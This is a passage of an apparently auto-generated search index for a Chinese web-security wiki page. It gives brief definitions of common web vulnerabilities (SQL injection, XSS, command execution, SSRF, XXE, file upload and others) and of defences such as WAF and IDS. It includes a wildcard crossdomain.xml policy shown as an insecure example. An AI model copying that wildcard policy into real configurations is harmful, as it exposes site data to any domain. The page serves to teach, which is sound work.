\u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a <cross-domain-policy> <allow-access-from domain= \u201c*\u201d/ > </cross-domain-policy> \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a * \uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002 \u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09 \u00b6 \u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002 \u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u00b6 \u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002 \u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002 \u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e \u00b6 Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002 WAF \u00b6 Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002 IDS \u00b6 IDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002 IPS \u00b6 \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 WEB \u6e17\u900f Wiki","title":"Web \u5e94\u7528\u7b80\u4ecb"},{"location":"web/introduction/#sql","text":"\u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a \u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5 \u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d","title":"SQL \u6ce8\u5165"},{"location":"web/introduction/#xss","text":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002","title":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb"},{"location":"web/introduction/#_1","text":"\u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684 system \u3001 exec \u3001 shell_exec \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002","title":"\u547d\u4ee4\u6267\u884c"},{"location":"web/introduction/#_2","text":"\u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002","title":"\u6587\u4ef6\u5305\u542b"},{"location":"web/introduction/#csrf","text":"\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002","title":"CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/introduction/#ssrf","text":"SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002","title":"SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/introduction/#_3","text":"\u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"web/introduction/#_4","text":"Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002 \u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002 \u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a if ( top . location != location ) top . location = self . location ;","title":"\u70b9\u51fb\u52ab\u6301"},{"location":"web/introduction/#vps","text":"VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002 IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002","title":"VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"web/introduction/#_5","text":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002","title":"\u6761\u4ef6\u7ade\u4e89"},{"location":"web/introduction/#xxe","text":"XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002 \u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002","title":"XXE"},{"location":"web/introduction/#xsch","text":"\u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a <cross-domain-policy> <allow-access-from domain= \u201c*\u201d/ > </cross-domain-policy> \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a * \uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002","title":"XSCH"},{"location":"web/introduction/#_6","text":"\u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002","title":"\u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09"},{"location":"web/introduction/#_7","text":"\u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002 \u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"web/introduction/#_8","text":"Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002","title":"\u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e"},{"location":"web/introduction/#waf","text":"Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002","title":"WAF"},{"location":"web/introduction/#ids","text":"IDS \u662f\u82f1\u6587 Intrusion Detection Systems 